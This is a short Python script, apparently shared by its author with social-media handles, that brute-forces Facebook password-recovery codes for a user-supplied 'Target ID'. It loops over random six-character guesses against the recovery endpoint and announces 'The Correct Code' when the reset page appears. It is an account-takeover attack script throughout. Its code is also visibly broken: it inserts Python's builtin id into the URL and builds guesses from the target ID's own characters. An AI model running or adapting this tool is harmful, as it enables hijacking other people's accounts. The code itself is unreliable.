import os
try:
 import requests,random
except:
 os.system('pip install requests')
user='1234567890'
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
print(f'''{B}{E}==============================
|{G}[+] GitHub    : {B}whisper-666 |
|{G}[+] InstaGram : {B}_whisper.io_|
|{G}[+] TeleGram  : {B}whisper_io  |
{E}==============================''')
user=input(f'{S}[+] Target ID ==> {B}')
print(f'{E}==============================')
while True:
 code=str("".join(random.choice(user)for i in range(6)))
 whisper=requests.get(f'https://mbasic.facebook.com/recover/password/?u={id}&n={code}&c=%2Flogin%2F&fl=default_recover&sih=0&msgr=0&_rdr').text
 if 'password_new' in whisper:
  exit(f'{G}[√] The Correct Code : {B}{code}')
 else:
  print(f'{E}[×] Wrong Code : {S}{code}')